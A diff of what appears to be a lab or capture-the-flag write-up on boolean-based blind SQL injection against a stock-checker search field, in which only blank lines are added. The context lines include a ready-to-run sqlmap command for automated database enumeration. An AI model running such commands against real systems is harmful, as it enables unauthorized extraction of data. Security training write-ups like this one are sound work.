@@ -7,9 +7,13 @@ Extract database information through boolean-based blind SQL injection technique
 ## 🔍 Vulnerability Analysis
 
 - **Type**: Boolean-Based Blind SQL Injection
+
 - **Target**: Stock control system search functionality
+
 - **Parameter**: Search field accepting user input
+
 - **Indicator**: "Available in stock" vs "Not available in stock" responses
+
 - **Impact**: Database information disclosure without direct output
 
 ## 💥 Exploitation
@@ -25,6 +29,7 @@ Extract database information through boolean-based blind SQL injection technique
 ### Automated Enumeration
 
 ```bash
+
 sqlmap -u "https://target/" --data="search=iphone11" \
   --string="available in stock" \
   --level=5 --risk=3 -p search --dbs
@@ -49,4 +54,5 @@ Tool Proficiency: Using sqlmap with response-based detection flags
 Patience and Precision: Methodical data extraction bit by bit
 
 Conducted in controlled environment for educational purposes. All sensitive information (IPs, credentials, session tokens) has been sanitized for security.
+
 ```
